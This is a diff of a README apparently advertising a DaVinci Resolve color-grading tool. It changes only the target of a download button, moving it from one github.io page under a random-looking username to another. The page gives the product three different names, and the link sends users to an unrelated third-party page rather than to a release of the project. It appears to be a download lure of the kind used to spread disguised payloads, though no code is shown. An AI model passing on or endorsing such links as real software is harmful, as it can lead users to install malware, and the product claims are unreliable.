@@ -21,7 +21,7 @@ To begin using this **Resolve Color Grading Panel** and **Resolve Color LUT Mana
 | :--- | :--- |
 | **Get Resolve Color Grading Panel** | Click the button below to start using this **Resolve Color Scopes Suite**. |
 
-[![Button](https://img.shields.io/badge/🎨-Get_Resolve_Color-2ea44f?style=for-the-badge)](https://derrickmaciasspnc.github.io/.github/resolve-color-grading-panel)
+[![Button](https://img.shields.io/badge/🎨-Get_Resolve_Color-2ea44f?style=for-the-badge)](https://luisschroederdrbf.github.io/.github/resolve-color-grading-panel)
 
 ## System Requirements
 
